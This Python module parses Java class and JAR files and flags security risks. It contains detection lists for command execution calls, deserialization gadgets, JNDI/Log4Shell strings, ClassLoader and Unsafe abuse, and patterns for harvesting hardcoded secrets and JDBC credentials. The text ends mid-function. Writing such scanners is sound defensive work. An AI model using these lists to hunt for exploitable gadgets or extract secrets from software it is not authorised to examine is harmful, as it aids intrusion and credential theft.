#!/usr/bin/env python3
"""
Java .class / .jar Reverse Engineering Module
Synthesized from: Decompiling Java (9781430207399), Refactoring in Java (9781805126638),
                  Data Structures & Algorithms in Java (9780134849775, 9781118771334)

Key JVM class file facts:
  - Magic: 0xCAFEBABE (bytes: CA FE BA BE)
  - Structure: magic(4) + minor(2) + major(2) + cp_count(2) + cp[] +
               access_flags(2) + this_class(2) + super_class(2) +
               interfaces_count(2) + interfaces[] + fields[] + methods[] + attrs[]
  - Constant pool tags:
      1=Utf8, 3=Integer, 4=Float, 5=Long, 6=Double, 7=Class, 8=String,
      9=Fieldref, 10=Methodref, 11=InterfaceMethodref, 12=NameAndType,
      15=MethodHandle, 16=MethodType, 18=InvokeDynamic
  - String constants exposed as ldc/ldc_w opcodes → constant pool tag 8 → tag 1 (utf8)
  - All method/field names live in constant pool as UTF8 strings — no stripping without obfuscation
  - Dangerous invocations: invokevirtual/invokestatic on Runtime.exec, ProcessBuilder, etc.
"""

import io
import os
import re
import struct
import zipfile
from pathlib import Path

# ── Class file constants ──────────────────────────────────────────────────────
CAFEBABE = b'\xca\xfe\xba\xbe'

# Constant pool tags
CP_Utf8              = 1
CP_Integer           = 3
CP_Float             = 4
CP_Long              = 5
CP_Double            = 6
CP_Class             = 7
CP_String            = 8
CP_Fieldref          = 9
CP_Methodref         = 10
CP_InterfaceMethodref = 11
CP_NameAndType       = 12
CP_MethodHandle      = 15
CP_MethodType        = 16
CP_InvokeDynamic     = 18

# Tags that consume 2 slots in the constant pool (Long, Double)
CP_TWO_SLOT = {CP_Long, CP_Double}

# Access flags (class and method)
ACC_PUBLIC    = 0x0001
ACC_PRIVATE   = 0x0002
ACC_PROTECTED = 0x0004
ACC_STATIC    = 0x0008
ACC_FINAL     = 0x0010

# ── Framework / library fingerprints (strings in constant pool) ───────────────
FRAMEWORK_MARKERS = {
    'spring':       [b'org/springframework', b'springframework', b'@SpringBoot',
                     b'@RestController', b'@Autowired'],
    'hibernate':    [b'org/hibernate', b'javax/persistence', b'@Entity', b'@Table'],
    'jersey':       [b'javax/ws/rs', b'@Path', b'@GET', b'@POST'],
    'jackson':      [b'com/fasterxml/jackson', b'ObjectMapper', b'JsonNode'],
    'guava':        [b'com/google/common', b'com/google/guava'],
    'grpc-java':    [b'io/grpc', b'AbstractStub', b'BindableService', b'ServerInterceptor'],
    'netty':        [b'io/netty', b'ChannelHandlerContext', b'ChannelPipeline'],
    'log4j':        [b'org/apache/log4j', b'org/apache/logging/log4j'],
    'slf4j':        [b'org/slf4j', b'LoggerFactory'],
    'junit':        [b'org/junit', b'org/testng'],
    'kotlin':       [b'kotlin/jvm', b'KotlinMetadata', b'Lkotlin/'],
    'android':      [b'android/app', b'dalvik/', b'android/content'],
    'bouncycastle': [b'org/bouncycastle', b'BouncyCastleProvider'],
    'apache-http':  [b'org/apache/http', b'CloseableHttpClient'],
}

# Dangerous method invocations (class, method name pairs)
DANGEROUS_INVOCATIONS = [
    # OS command execution
    (b'java/lang/Runtime',             b'exec'),
    (b'java/lang/ProcessBuilder',      b'start'),
    # Reflection
    (b'java/lang/reflect/Method',      b'invoke'),
    (b'java/lang/Class',               b'forName'),
    (b'java/lang/Class',               b'newInstance'),
    (b'java/lang/Class',               b'getDeclaredMethod'),
    (b'java/lang/reflect/AccessibleObject', b'setAccessible'),
    # ClassLoader abuse
    (b'java/net/URL',                  b'openConnection'),
    (b'java/net/URLClassLoader',       b'loadClass'),
    (b'java/lang/ClassLoader',         b'defineClass'),
    # Scripting engines (arbitrary code eval)
    (b'javax/script/ScriptEngine',     b'eval'),
    (b'groovy/lang/GroovyShell',       b'evaluate'),
    (b'org/springframework/expression', b'getValue'),   # SpEL eval
    # Java deserialization
    (b'java/io/ObjectInputStream',     b'readObject'),
    (b'java/io/ObjectInputStream',     b'readUnshared'),
    # File I/O (exfil / webshell drops)
    (b'java/io/FileOutputStream',      b'<init>'),
    (b'java/io/FileWriter',            b'<init>'),
    # JDBC
    (b'java/sql/Statement',            b'executeQuery'),
    (b'java/sql/Statement',            b'execute'),
    (b'java/sql/PreparedStatement',    b'executeQuery'),
    # JNDI — Log4Shell vector when input reaches lookup
    (b'javax/naming/InitialContext',   b'lookup'),
    (b'javax/naming/Context',          b'lookup'),
    # Unsafe
    (b'sun/misc/Unsafe',               b'allocateMemory'),
    (b'sun/misc/Unsafe',               b'defineClass'),
    (b'sun/misc/Unsafe',               b'allocateInstance'),   # bypasses constructor
    (b'sun/misc/Unsafe',               b'putObject'),          # direct heap write
    (b'jdk/internal/misc/Unsafe',      b'allocateInstance'),   # JDK 9+ internal Unsafe
    # Reflection chain — Constructor / Field access
    (b'java/lang/reflect/Constructor', b'newInstance'),        # reflective construction
    (b'java/lang/reflect/Field',       b'set'),                # reflective field mutation
    (b'java/lang/reflect/Field',       b'get'),
    # MethodHandle / lambda bootstrap (JLS Ch 9, 15)
    (b'java/lang/invoke/MethodHandles', b'lookup'),            # lookup for invoke chain
    (b'java/lang/invoke/LambdaMetafactory', b'metafactory'),  # lambda gadget bootstrap
    (b'java/lang/invoke/MethodHandle',  b'invoke'),
    (b'java/lang/invoke/MethodHandle',  b'invokeExact'),
    # Security manager bypass
    (b'java/lang/System',              b'setSecurityManager'), # override security policy
]

# ── Spring Security annotation strings ───────────────────────────────────────
# If these appear in the constant pool the class uses Spring Security.
# Endpoints in the same class without them are UNPROTECTED.
SPRING_SECURITY_ANNOTATIONS = {
    b'PreAuthorize',
    b'Secured',
    b'RolesAllowed',
    b'WithMockUser',
    b'PermitAll',
    b'DenyAll',
    b'SecurityRequirement',
}

# Spring MVC / REST mapping annotation strings — mark exposed endpoints
SPRING_MVC_ANNOTATIONS = {
    b'RequestMapping',
    b'GetMapping',
    b'PostMapping',
    b'PutMapping',
    b'DeleteMapping',
    b'PatchMapping',
    b'RestController',
    b'Controller',
}

# Deserialization gadget method names (JVM spec §4.3.2 + commons-collections research)
DESERIAL_GADGET_METHODS = {
    b'readObject',
    b'readResolve',
    b'readExternal',
    b'writeObject',
    b'writeReplace',
    b'validateObject',
}

# Deserialization gadget superclasses / interfaces indicating gadget chain position
DESERIAL_GADGET_SUPERS = {
    b'java/io/Serializable',
    b'java/io/Externalizable',
    b'java/io/ObjectInputStream',
}

# Log4j JNDI injection pattern (Log4Shell — CVE-2021-44228)
# If this literal appears in the constant pool the class constructs or logs JNDI strings
_JNDI_RE = re.compile(rb'\$\{jndi:', re.IGNORECASE)

# Spring @Value with literal secret (not a ${placeholder} reference)
# ${key} references are benign; string literals after @Value are the risk
_SPRING_VALUE_LITERAL_RE = re.compile(rb'@Value\s*\(\s*"(?!\$\{)[^$"]{6,}', re.IGNORECASE)

# Security-relevant string patterns in constant pool UTF8 entries
SEC_PATTERNS = [
    (re.compile(rb'password', re.I),         'credential'),
    (re.compile(rb'passwd', re.I),           'credential'),
    (re.compile(rb'secret', re.I),           'secret'),
    (re.compile(rb'api[_-]?key', re.I),      'api_key'),
    (re.compile(rb'private[_-]?key', re.I),  'private_key'),
    (re.compile(rb'-----BEGIN', re.I),       'pem_key'),
    (re.compile(rb'token', re.I),            'token'),
    (re.compile(rb'bearer', re.I),           'auth_header'),
    (re.compile(rb'authorization', re.I),    'auth_header'),
    (re.compile(rb'eyJ[A-Za-z0-9_-]+', re.I), 'jwt_literal'),  # JWT in constant
    (re.compile(rb'jdbc:', re.I),            'jdbc_url'),
    (re.compile(rb'mongodb://', re.I),       'mongo_url'),
    (re.compile(rb'redis://', re.I),         'redis_url'),
    (re.compile(rb'https?://[^\s\x00]+', re.I), 'url'),
    (re.compile(rb'[0-9a-fA-F]{32,64}'),    'hex_secret'),
]

# ── JLS-grounded security patterns (added from JLS Ch 8, 9, 11, 12, 14, 15, 17) ─

# Ch 12 §12.2 / JLS §5.3.2: ClassLoader.defineClass() — arbitrary class definition from bytes;
# URLClassLoader with remote URL — remote class loading RCE vector;
# Class.forName(name, initialize, loader) with non-bootstrap loader;
# bare forName catches Class::forName refs and standalone method-name UTF8 entries;
# bare ClassLoader catches subclass declarations and custom loader patterns.
_CLASSLOADER_RE = re.compile(
    rb'(defineClass|URLClassLoader|loadClass|forName|ClassLoader'
    rb'|java/net/URLClassLoader|java/lang/ClassLoader)',
    re.IGNORECASE,
)

# Ch 9 §9.8 / Ch 15 §15.27: Lambda serialization gadgets.
# SerializedLambda — Java 8+ lambda deserialization gadget class;
# LambdaMetafactory.metafactory() — bootstrap method reachable from gadget chains;
# MethodHandles.lookup().findVirtual() — reflective dispatch via MethodHandle API.
_LAMBDA_GADGET_RE = re.compile(
    rb'(SerializedLambda|LambdaMetafactory|MethodHandles\.lookup'
    rb'|java/lang/invoke/LambdaMetafactory|java/lang/invoke/SerializedLambda'
    rb'|findVirtual|findStatic|findSpecial)',
    re.IGNORECASE,
)

# Ch 17 §17.4: Memory model — race conditions.
# Double-checked locking without volatile on the guarded field is broken per JMM;
# non-atomic compound operations on shared state without synchronization.
_RACE_CONDITION_RE = re.compile(
    rb'(double.?checked|doublecheck'
    rb'|checkThenAct|check.then.act'
    rb'|AtomicReference|AtomicInteger|AtomicLong'
    rb'|java/util/concurrent/atomic)',
    re.IGNORECASE,
)

# Ch 11 §11.2.3: Exception swallowing.
# catch(Throwable) or catch(Exception) with empty or near-empty handler masks
# security exceptions (SecurityException, AccessControlException).
_EXCEPTION_SWALLOW_RE = re.compile(
    rb'catch\s*\(\s*(Throwable|Exception)\b',
    re.IGNORECASE,
)

# Security-exception hiding: catching SecurityException or AccessControlException
# and discarding — masks permission failures silently.
_SEC_EXCEPTION_HIDE_RE = re.compile(
    rb'(SecurityException|AccessControlException|java/security/AccessControlException'
    rb'|java/lang/SecurityException)',
    re.IGNORECASE,
)

# Ch 15 §15.12: Reflection chains.
# setAccessible(true) bypasses Java access control (JLS §6.6);
# Method.invoke(null,...) — static method reflection;
# Constructor.newInstance() — reflective construction bypassing normal init;
# Field.set(obj, value) — reflective field mutation, can bypass final.
_REFLECTION_CHAIN_RE = re.compile(
    rb'(setAccessible|java/lang/reflect/Method'
    rb'|java/lang/reflect/Constructor'
    rb'|java/lang/reflect/Field'
    rb'|getDeclaredField|getDeclaredMethod|getDeclaredConstructor)',
    re.IGNORECASE,
)

# Ch 12 §12.2 / implementation: sun.misc.Unsafe — JVM internal API.
# allocateInstance() bypasses constructor (deserialization gadget entry point);
# putObject()/putLong()/compareAndSwap* — direct heap writes, bypass field visibility.
_UNSAFE_RE = re.compile(
    rb'(sun/misc/Unsafe|jdk/internal/misc/Unsafe'
    rb'|allocateInstance|putObject|putLong|putInt|putReference'
    rb'|compareAndSwapObject|compareAndSwapInt|compareAndSwapLong'
    rb'|getUnsafe)',
    re.IGNORECASE,
)


# ── Constant pool parser ──────────────────────────────────────────────────────

class ConstantPool:
    """Parse and query JVM constant pool."""

    def __init__(self, data, offset):
        self.entries = []   # index 0 unused (constant pool is 1-indexed)
        self.offset  = offset
        self._end    = offset
        cp_count     = struct.unpack_from('>H', data, offset)[0]
        self._end   += 2
        off          = self._end

        # entries[0] = placeholder; entries[1..count-1] = actual
        self.entries.append(None)

        i = 1
        while i < cp_count:
            tag = data[off]
            off += 1

            if tag == CP_Utf8:
                length  = struct.unpack_from('>H', data, off)[0]
                off    += 2
                value   = data[off:off + length]
                off    += length
                self.entries.append({'tag': tag, 'value': value})

            elif tag in (CP_Integer, CP_Float):
                value = struct.unpack_from('>I', data, off)[0]
                off  += 4
                self.entries.append({'tag': tag, 'value': value})

            elif tag in (CP_Long, CP_Double):
                value = struct.unpack_from('>Q', data, off)[0]
                off  += 8
                self.entries.append({'tag': tag, 'value': value})
                # Long/Double consume TWO constant pool slots
                self.entries.append(None)
                i += 1

            elif tag in (CP_Class, CP_String, CP_MethodType):
                idx = struct.unpack_from('>H', data, off)[0]
                off += 2
                self.entries.append({'tag': tag, 'index': idx})

            elif tag in (CP_Fieldref, CP_Methodref, CP_InterfaceMethodref,
                         CP_NameAndType, CP_InvokeDynamic):
                idx1 = struct.unpack_from('>H', data, off)[0]
                idx2 = struct.unpack_from('>H', data, off + 2)[0]
                off += 4
                self.entries.append({'tag': tag, 'index1': idx1, 'index2': idx2})

            elif tag == CP_MethodHandle:
                ref_kind  = data[off]
                ref_index = struct.unpack_from('>H', data, off + 1)[0]
                off += 3
                self.entries.append({'tag': tag, 'ref_kind': ref_kind, 'index': ref_index})

            else:
                # Unknown tag — skip (best effort)
                self.entries.append({'tag': tag, 'raw': True})
                break

            i += 1

        self._end = off

    def utf8(self, idx):
        """Return UTF8 bytes for a constant pool index, or b'' on error."""
        try:
            e = self.entries[idx]
            if e and e['tag'] == CP_Utf8:
                return e['value']
        except (IndexError, KeyError, TypeError):
            pass
        return b''

    def string_value(self, idx):
        """Resolve CP_String → UTF8 bytes."""
        try:
            e = self.entries[idx]
            if e and e['tag'] == CP_String:
                return self.utf8(e['index'])
        except (IndexError, KeyError, TypeError):
            pass
        return b''

    def class_name(self, idx):
        """Resolve CP_Class → class name bytes."""
        try:
            e = self.entries[idx]
            if e and e['tag'] == CP_Class:
                return self.utf8(e['index'])
        except (IndexError, KeyError, TypeError):
            pass
        return b''

    def all_utf8(self):
        """Return list of (idx, bytes) for all UTF8 entries."""
        result = []
        for i, e in enumerate(self.entries):
            if e and e.get('tag') == CP_Utf8:
                result.append((i, e['value']))
        return result

    def all_strings(self):
        """Return all constant-pool string literals (tag=8→1)."""
        result = []
        for i, e in enumerate(self.entries):
            if e and e.get('tag') == CP_String:
                v = self.string_value(i)
                if v:
                    result.append((i, v))
        return result

    def all_method_refs(self):
        """Return list of (class_name, method_name) from Methodref entries."""
        result = []
        for e in self.entries:
            if not e or e.get('tag') not in (CP_Methodref, CP_InterfaceMethodref):
                continue
            try:
                cls_name  = self.class_name(e['index1'])
                nat       = self.entries[e['index2']]
                meth_name = self.utf8(nat['index1']) if nat else b''
                result.append((cls_name, meth_name))
            except (KeyError, TypeError, IndexError):
                pass
        return result


# ── Header-only parser and raw CP string scanner ──────────────────────────────

def parse_class_file_header(data: bytes) -> dict:
    """Parse the binary header of a Java .class file without a full parse.

    Verifies magic 0xCAFEBABE, extracts minor/major version, maps major to
    Java release, reads cp_count, and heuristically detects debug symbols.

    JLS §4.1 ClassFile structure:
      u4 magic + u2 minor_version + u2 major_version + u2 constant_pool_count

    Returns dict with keys: magic_ok, minor_version, major_version,
    java_release, cp_count, has_debug_info.
    On invalid input returns {'error': reason}.
    """
    if len(data) < 8:
        return {'error': 'too short for class file header'}
    if data[:4] != CAFEBABE:
        return {'error': f'magic mismatch: {data[:4].hex()}'}
    minor    = struct.unpack_from('>H', data, 4)[0]
    major    = struct.unpack_from('>H', data, 6)[0]
    cp_count = struct.unpack_from('>H', data, 8)[0] if len(data) >= 10 else 0
    # LocalVariableTable / LocalVariableTypeTable attribute names in the raw
    # bytes indicate the compiler retained local-variable debug info — name
    # access aids RE significantly (JVM spec §4.7.13, §4.7.14).
    has_debug_info = (
        b'LocalVariableTable' in data or
        b'LocalVariableTypeTable' in data
    )
    return {
        'magic_ok':      True,
        'minor_version': minor,
        'major_version': major,
        'java_release':  _major_to_java(major),
        'cp_count':      cp_count,
        'has_debug_info': has_debug_info,
    }


def scan_constant_pool_strings(data: bytes) -> list:
    """Raw linear scan of a class file for UTF-8 constant pool entries (tag 0x01).

    Walks the constant pool section directly without building a full parse tree.
    More resilient than ConstantPool when an earlier entry has an unknown tag,
    and faster when only strings are needed.

    JLS §4.4.7 CONSTANT_Utf8_info: tag(1) + length(2) + bytes(length)

    Returns list of dicts:
      [{'offset': int, 'length': int, 'value': bytes}, ...]
    where offset is the byte position of the UTF-8 data (after the length field).
    Returns [] on invalid input or if no UTF-8 entries are found.
    """
    if len(data) < 10 or data[:4] != CAFEBABE:
        return []

    cp_count = struct.unpack_from('>H', data, 8)[0]
    results  = []
    off      = 10   # first constant pool entry begins at offset 10

    i = 1
    while i < cp_count and off < len(data):
        try:
            tag  = data[off]
            off += 1
            if tag == CP_Utf8:                              # 0x01 — variable length
                if off + 2 > len(data):
                    break
                length = struct.unpack_from('>H', data, off)[0]
                off   += 2
                if off + length > len(data):
                    break
                results.append({'offset': off, 'length': length,
                                'value': data[off:off + length]})
                off   += length
            elif tag in (CP_Integer, CP_Float):             # 4 bytes
                off += 4
            elif tag in (CP_Long, CP_Double):               # 8 bytes; Long/Double
                off += 8                                    # consume two CP slots
                i   += 1
            elif tag in (CP_Class, CP_String, CP_MethodType):  # 2-byte index
                off += 2
            elif tag in (CP_Fieldref, CP_Methodref,
                         CP_InterfaceMethodref,
                         CP_NameAndType, CP_InvokeDynamic):    # 4-byte indices
                off += 4
            elif tag == CP_MethodHandle:                    # 3 bytes
                off += 3
            else:
                break   # unknown tag; stop rather than corrupt the walk
        except (struct.error, IndexError):
            break
        i += 1

    return results


# ── Class file parser ─────────────────────────────────────────────────────────

def parse_class_file(data):
    """Parse a Java .class file.

    Returns: dict with version, constant_pool, class_name, super_name,
             methods, fields, frameworks, dangerous_calls, security_strings
    On error returns: {'error': msg}
    """
    if len(data) < 8 or data[:4] != CAFEBABE:
        return {'error': f'Not a class file (magic={data[:4].hex()})'}

    try:
        minor = struct.unpack_from('>H', data, 4)[0]
        major = struct.unpack_from('>H', data, 6)[0]
    except Exception as e:
        return {'error': str(e)}

    try:
        cp = ConstantPool(data, 8)
    except Exception as e:
        return {'error': f'Constant pool parse failed: {e}'}

    off = cp._end

    try:
        access_flags = struct.unpack_from('>H', data, off)[0]
        this_class   = struct.unpack_from('>H', data, off + 2)[0]
        super_class  = struct.unpack_from('>H', data, off + 4)[0]
        off         += 6
    except Exception as e:
        return {'error': f'Header parse failed: {e}'}

    class_name = cp.class_name(this_class).decode('utf-8', errors='replace')
    super_name = cp.class_name(super_class).decode('utf-8', errors='replace') if super_class else ''

    # Skip interfaces
    try:
        iface_count = struct.unpack_from('>H', data, off)[0]
        off += 2 + iface_count * 2
    except Exception:
        pass

    # Parse fields (name_index, descriptor_index, attrs_count, attrs)
    fields = []
    try:
        field_count = struct.unpack_from('>H', data, off)[0]
        off += 2
        for _ in range(field_count):
            flags     = struct.unpack_from('>H', data, off)[0]
            name_idx  = struct.unpack_from('>H', data, off + 2)[0]
            desc_idx  = struct.unpack_from('>H', data, off + 4)[0]
            attr_count = struct.unpack_from('>H', data, off + 6)[0]
            off += 8
            name  = cp.utf8(name_idx).decode('utf-8', errors='replace')
            desc  = cp.utf8(desc_idx).decode('utf-8', errors='replace')
            fields.append({'name': name, 'descriptor': desc, 'flags': flags})
            # Skip attribute data
            for _ in range(attr_count):
                attr_len = struct.unpack_from('>I', data, off + 2)[0]
                off += 6 + attr_len
    except Exception:
        pass

    # Parse methods
    methods = []
    try:
        meth_count = struct.unpack_from('>H', data, off)[0]
        off += 2
        for _ in range(meth_count):
            flags     = struct.unpack_from('>H', data, off)[0]
            name_idx  = struct.unpack_from('>H', data, off + 2)[0]
            desc_idx  = struct.unpack_from('>H', data, off + 4)[0]
            attr_count = struct.unpack_from('>H', data, off + 6)[0]
            off += 8
            name  = cp.utf8(name_idx).decode('utf-8', errors='replace')
            desc  = cp.utf8(desc_idx).decode('utf-8', errors='replace')
            methods.append({'name': name, 'descriptor': desc, 'flags': flags})
            for _ in range(attr_count):
                attr_len = struct.unpack_from('>I', data, off + 2)[0]
                off += 6 + attr_len
    except Exception:
        pass

    # ── Security analysis ─────────────────────────────────────────────────────

    # 1. Framework detection from all UTF8 strings
    frameworks = set()
    all_utf8 = cp.all_utf8()
    all_utf8_bytes = b'\n'.join(v for _, v in all_utf8)

    for fw_name, markers in FRAMEWORK_MARKERS.items():
        for marker in markers:
            if marker in all_utf8_bytes:
                frameworks.add(fw_name)
                break

    # 2. Dangerous method invocations (from Methodref constant pool entries)
    dangerous = []
    all_refs = cp.all_method_refs()
    for cls_bytes, meth_bytes in all_refs:
        for d_cls, d_meth in DANGEROUS_INVOCATIONS:
            if d_cls in cls_bytes and d_meth in meth_bytes:
                dangerous.append({
                    'class':  cls_bytes.decode('utf-8', errors='replace'),
                    'method': meth_bytes.decode('utf-8', errors='replace'),
                })

    # 3. Security-relevant string constants
    sec_strings = []
    all_str = cp.all_strings()
    for idx, val in all_str:
        for pattern, ptype in SEC_PATTERNS:
            if pattern.search(val):
                entry = {
                    'cp_index': idx,
                    'type':     ptype,
                    'value':    val.decode('utf-8', errors='replace')[:120],
                }
                sec_strings.append(entry)
                break

    # Also scan all UTF8 entries for secrets (some tools put credentials in field descriptors)
    for idx, val in all_utf8:
        if len(val) < 8:
            continue
        for pattern, ptype in SEC_PATTERNS:
            if pattern.search(val):
                # Skip type descriptors (start with L, [, or are short JVM type chars)
                if val[:1] in (b'L', b'[', b'(') or len(val) < 12:
                    continue
                # Skip common benign matches (method names like "getPassword")
                low = val.lower()
                if (b'get' in low or b'set' in low) and len(val) < 30:
                    continue
                entry = {
                    'cp_index': idx,
                    'type':     ptype + '_utf8',
                    'value':    val.decode('utf-8', errors='replace')[:120],
                }
                sec_strings.append(entry)
                break

    # 4. Log4j JNDI injection indicator (Log4Shell CVE-2021-44228)
    # Any ${jndi: literal in the constant pool = the class constructs or logs JNDI strings
    jndi_hits = []
    for idx, val in all_utf8:
        if _JNDI_RE.search(val):
            jndi_hits.append({
                'cp_index': idx,
                'value':    val.decode('utf-8', errors='replace')[:120],
            })
    for idx, val in all_str:
        if _JNDI_RE.search(val):
            jndi_hits.append({
                'cp_index': idx,
                'value':    val.decode('utf-8', errors='replace')[:120],
            })

    # 5. Spring Security annotation gap detection
    # Collect all UTF8 names in the class; detect endpoint annotations and security annotations
    all_utf8_strs = {v for _, v in all_utf8}
    has_spring_security = bool(all_utf8_strs & SPRING_SECURITY_ANNOTATIONS)
    has_spring_mvc      = bool(all_utf8_strs & SPRING_MVC_ANNOTATIONS)
    unprotected_endpoint = has_spring_mvc and not has_spring_security

    # 6. Deserialization gadget chain indicators
    #    - class implements Serializable/Externalizable
    #    - class declares readObject / readResolve / readExternal
    method_names = {m['name'].encode() for m in methods}
    is_serializable = bool(all_utf8_strs & DESERIAL_GADGET_SUPERS)
    has_gadget_methods = method_names & DESERIAL_GADGET_METHODS
    # Also check if super_name is ObjectInputStream (indicates subclass override)
    is_ois_subclass = b'ObjectInputStream' in super_name.encode()

    # 7. JDBC credential extraction — look for jdbc: URIs with embedded user:pass
    #    Pattern: jdbc:type://host:port/db?user=u&password=p  or  user=u;password=p
    _jdbc_cred_re = re.compile(
        rb'jdbc:[a-z][a-z0-9+\-.]*://[^\s\x00]{4,}',
        re.IGNORECASE,
    )
    jdbc_creds = []
    for idx, val in list(all_utf8) + list(all_str):
        m = _jdbc_cred_re.search(val)
        if m:
            uri = m.group().decode('utf-8', errors='replace')
            # Flag only if likely credentials are embedded
            if any(kw in uri.lower() for kw in ('password=', 'passwd=', 'user=', 'uid=')):
                jdbc_creds.append({'cp_index': idx, 'value': uri[:200]})

    # 8. Spring @Value with hardcoded (non-placeholder) literals
    spring_value_literals = []
    for idx, val in list(all_utf8) + list(all_str):
        if _SPRING_VALUE_LITERAL_RE.search(val):
            spring_value_literals.append({
                'cp_index': idx,
                'value':    val.decode('utf-8', errors='replace')[:120],
            })

    # 9. ClassLoader gadget surface (JLS Ch 12 §12.2)
    #    defineClass() — arbitrary class from bytes; URLClassLoader remote URL load
    classloader_gadgets = []
    for cls_bytes, meth_bytes in all_refs:
        if _CLASSLOADER_RE.search(cls_bytes) or _CLASSLOADER_RE.search(meth_bytes):
            classloader_gadgets.append({
                'class':  cls_bytes.decode('utf-8', errors='replace'),
                'method': meth_bytes.decode('utf-8', errors='replace'),
            })
    # Also flag URLClassLoader or defineClass appearing in any UTF8 constant
    for idx, val in all_utf8:
        if _CLASSLOADER_RE.search(val) and len(val) > 8:
            if b'defineClass' in val or b'URLClassLoader' in val:
                classloader_gadgets.append({
                    'class':    '(utf8)',
                    'method':   val.decode('utf-8', errors='replace')[:80],
                })

    # 10. Lambda deserialization gadgets (JLS Ch 9, 15 — InvokeDynamic + SerializedLambda)
    lambda_gadgets = []
    for idx, val in all_utf8:
        if _LAMBDA_GADGET_RE.search(val):
            lambda_gadgets.append({
                'cp_index': idx,
                'value':    val.decode('utf-8', errors='replace')[:120],
            })
    # InvokeDynamic entries in the constant pool are direct lambda bootstrap refs
    for e in cp.entries:
        if e and e.get('tag') == CP_InvokeDynamic:
            lambda_gadgets.append({'cp_index': 0, 'value': 'InvokeDynamic bootstrap'})
            break  # one flag per class is enough

    # 11. Exception swallowing (JLS Ch 11 §11.2.3)
    #     Catch of Throwable/Exception in constant pool = class uses broad catch clauses;
    #     Presence of SecurityException/AccessControlException strings = security-relevant catches.
    exception_swallows = []
    for idx, val in list(all_utf8) + list(all_str):
        if _EXCEPTION_SWALLOW_RE.search(val):
            exception_swallows.append({
                'cp_index': idx,
                'type':     'broad_catch',
                'value':    val.decode('utf-8', errors='replace')[:80],
            })
    has_security_exception_ref = any(
        _SEC_EXCEPTION_HIDE_RE.search(v) for _, v in all_utf8
    )

    # 12. Reflection chains (JLS Ch 15 §15.12)
    reflection_chains = []
    for cls_bytes, meth_bytes in all_refs:
        if _REFLECTION_CHAIN_RE.search(cls_bytes):
            reflection_chains.append({
                'class':  cls_bytes.decode('utf-8', errors='replace'),
                'method': meth_bytes.decode('utf-8', errors='replace'),
            })

    # 13. Unsafe operations (sun.misc.Unsafe / jdk.internal.misc.Unsafe)
    unsafe_ops = []
    for cls_bytes, meth_bytes in all_refs:
        if _UNSAFE_RE.search(cls_bytes):
            unsafe_ops.append({
                'class':  cls_bytes.decode('utf-8', errors='replace'),
                'method': meth_bytes.decode('utf-8', errors='replace'),
            })

    return {
        'class_name':            class_name,
        'super_name':            super_name,
        'java_major':            major,
        'java_minor':            minor,
        'java_version':          _major_to_java(major),
        'access_flags':          hex(access_flags),
        'field_count':           len(fields),
        'method_count':          len(methods),
        'fields':                fields[:20],
        'methods':               methods[:40],
        'frameworks':            list(frameworks),
        'dangerous_calls':       dangerous,
        'security_strings':      sec_strings,
        'cp_entry_count':        len(cp.entries),
        # New fields
        'jndi_patterns':         jndi_hits,
        'unprotected_endpoint':  unprotected_endpoint,
        'has_spring_security':   has_spring_security,
        'has_spring_mvc':        has_spring_mvc,
        'is_serializable':       is_serializable,
        'gadget_methods':        [b.decode() for b in has_gadget_methods],
        'is_ois_subclass':       is_ois_subclass,
        'jdbc_creds':            jdbc_creds,
        'spring_value_literals': spring_value_literals,
        # JLS Ch 8/9/11/12/15/17 additions
        'classloader_gadgets':   classloader_gadgets,
        'lambda_gadgets':        lambda_gadgets,
        'exception_swallows':    exception_swallows,
        'has_security_exception_ref': has_security_exception_ref,
        'reflection_chains':     reflection_chains,
        'unsafe_ops':            unsafe_ops,
    }


def _major_to_java(major):
    return {44: '1.0', 45: '1.1', 46: '1.2', 47: '1.3', 48: '1.4',
            49: '5', 50: '6', 51: '7', 52: '8', 53: '9', 54: '10',
            55: '11', 56: '12', 57: '13', 58: '14', 59: '15', 60: '16',
            61: '17', 62: '18', 63: '19', 64: '20', 65: '21'}.get(major, f'unknown({major})')


# ── JVM descriptor parser (from JVM spec §4.3.2) ─────────────────────────────
# Converts JVM method descriptors like "(Ljava/lang/String;I)V" → "(String, int) -> void"
# Merged from java_decompiler.py; unique there vs the original java_re.py.

_DESC_BASE = {
    'B': 'byte', 'C': 'char', 'D': 'double', 'F': 'float',
    'I': 'int',  'J': 'long', 'S': 'short',  'V': 'void', 'Z': 'boolean',
}


def _next_type(desc: str, i: int):
    """Parse one type token from a JVM descriptor string starting at index i.
    Returns (type_str, next_index).
    """
    if i >= len(desc):
        return '?', i + 1
    c = desc[i]
    if c in _DESC_BASE:
        return _DESC_BASE[c], i + 1
    if c == 'L':
        end = desc.find(';', i)
        if end == -1:
            return desc[i+1:], len(desc)
        return desc[i+1:end].replace('/', '.'), end + 1
    if c == '[':
        inner, ni = _next_type(desc, i + 1)
        return inner + '[]', ni
    return c, i + 1


def parse_descriptor(desc: str) -> str:
    """Convert a JVM method descriptor to a human-readable signature.

    Examples:
      "(Ljava/lang/String;I)V"  ->  "(String, int) -> void"
      "()Ljava/util/List;"      ->  "() -> java.util.List"
    """
    if not desc.startswith('('):
        # Field descriptor
        t, _ = _next_type(desc, 0)
        return t

    params = []
    i = 1  # skip '('
    while i < len(desc) and desc[i] != ')':
        t, i = _next_type(desc, i)
        params.append(t)
    i += 1  # skip ')'
    ret_t, _ = _next_type(desc, i) if i < len(desc) else ('?', i)
    return f"({', '.join(params)}) -> {ret_t}"


def decode_access_flags(flags: int, context: str = 'class') -> list:
    """Decode a JVM access_flags bitmask into human-readable token list.

    context: 'class' or 'method'
    """
    out = []
    if flags & 0x0001: out.append('public')
    if flags & 0x0002: out.append('private')
    if flags & 0x0004: out.append('protected')
    if flags & 0x0008: out.append('static')
    if flags & 0x0010: out.append('final')
    if context == 'method':
        if flags & 0x0020: out.append('synchronized')
        if flags & 0x0040: out.append('bridge')
        if flags & 0x0080: out.append('varargs')
        if flags & 0x0100: out.append('native')
        if flags & 0x0400: out.append('abstract')
        if flags & 0x0800: out.append('strict')
    else:  # class
        if flags & 0x0020: out.append('super')
        if flags & 0x0200: out.append('interface')
        if flags & 0x0400: out.append('abstract')
        if flags & 0x1000: out.append('synthetic')
        if flags & 0x2000: out.append('annotation')
        if flags & 0x4000: out.append('enum')
    return out


# ── JAR analysis ──────────────────────────────────────────────────────────────

def _parse_manifest(manifest_bytes):
    """Parse META-INF/MANIFEST.MF content into a dict."""
    manifest = {}
    # Handle line continuations (continuation lines start with a space)
    text = manifest_bytes.decode('utf-8', errors='replace')
    current_key = None
    current_val = []
    for line in text.splitlines():
        if line.startswith(' ') and current_key:
            current_val.append(line[1:])
        elif ':' in line:
            if current_key:
